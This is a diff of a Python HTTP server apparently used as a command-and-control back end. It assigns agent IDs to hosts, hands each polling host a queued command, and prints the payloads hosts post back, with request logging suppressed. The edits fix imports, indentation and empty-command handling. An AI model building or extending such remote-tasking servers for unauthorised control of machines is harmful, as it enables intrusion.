@@ -4,8 +4,7 @@ import threading
 import urllib.parse
 from typing import TypedDict, Optional
 from concurrent_collections import ConcurrentDictionary
-import datetime
-from datetime import timezone
+from datetime import datetime, timezone
 import secrets
 import string
 import hmac
@@ -53,11 +52,11 @@ class MyRequestHandler(NoLogRequestHandler):
             uuid = self.generate_short_agent_id()
             host_record = self.create_host_record(uuid)
             self.upsert_host(hostname, uuid)
-            self.collective_handle(hostname)
-        self.send_response(200)
-        self.send_header('Content-type', 'text/plain')
-        self.send_header('Authorization', user_input.get(hostname, {}).get("uuid"))
-        self.end_headers()
+            #self.collective_handle(hostname)
+            self.send_response(200)
+            self.send_header('Content-type', 'text/plain')
+            self.send_header('Authorization', user_input.get(hostname, {}).get("uuid"))
+            self.end_headers()
         
 
     def do_POST(self):
@@ -87,8 +86,9 @@ class MyRequestHandler(NoLogRequestHandler):
         #Process the data (ex: handling plain text or json)
         #if the client send text or json
         body_string = body_byte.decode('utf-8')
-        print(f"\nRecieved POST payload: {body_string}\n{main_console}")
-        self.collective_handle()
+        if body_string.strip():
+            print(f"\nRecieved POST payload: {body_string}\n{main_console}")
+        self.collective_handle(hostname)
         
 
     def collective_handle(self, hostname):
@@ -98,7 +98,9 @@ class MyRequestHandler(NoLogRequestHandler):
         self.send_header('Content-type', 'text/plain')
         self.send_header('Authorization', user_input.get(hostname, {}).get("uuid"))
         self.end_headers()
-        self.wfile.write(bytes(user_input.get(hostname, {}).get("command"), 'utf-8'))
+        command = user_input.get(hostname, {}).get("command")
+        if isinstance(command, str) and command.strip():
+            self.wfile.write(bytes(command, 'utf-8'))
         self.upsert_host(hostname, command= "")
 
     def unauthorized_request(self, status_code=401):
